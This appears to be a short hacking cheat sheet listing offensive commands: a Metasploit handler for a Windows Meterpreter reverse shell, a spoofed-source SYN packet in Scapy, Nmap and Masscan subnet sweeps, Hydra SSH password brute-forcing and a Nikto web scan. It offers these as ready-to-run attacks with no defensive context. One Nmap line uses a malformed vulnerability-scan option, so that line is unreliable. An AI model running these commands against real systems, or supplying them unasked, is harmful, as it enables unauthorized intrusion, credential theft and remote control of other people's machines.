## My Scripts
https://github.com/can-ozkan/Python_For_Hackers

## Metasploit Framework
msfconsole \
use exploit/multi/handler \
set payload windows/meterpreter/reverse_tcp \
set LHOST <your-ip> \
set LPORT 4444 \
exploit

## Scapy
Sending a spoofed SYN scan \
from scapy.all import * \
send(IP(src="192.168.1.100", dst="192.168.1.1")/TCP(dport=80, flags="S"))

## Nmap
nmap -A -T4 192.168.1.0/24 \
nmap -Pn --scan vuln 192.168.1.0/24

## Masscan
masscan -p1-65535 192.168.1.0/24 --rate=10000

## Hydra
SSH Brute Force \
hydra -l admin -P passwords.txt ssh://192.168.1.10

## Nikto
nikto -h http://192.168.1.100

